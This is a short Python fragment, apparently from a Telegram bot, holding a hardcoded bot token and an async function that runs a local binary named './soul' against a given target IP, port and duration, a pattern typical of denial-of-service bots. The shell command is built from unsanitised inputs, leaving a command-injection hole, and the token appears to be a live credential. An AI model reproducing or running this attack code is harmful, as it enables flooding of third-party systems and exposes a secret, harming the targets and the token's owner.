...
TOKEN = '7209543955:AAEZvlJEMS8oXltI3TIJPH6WlbMGAbBjYys'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 30 575615631834")
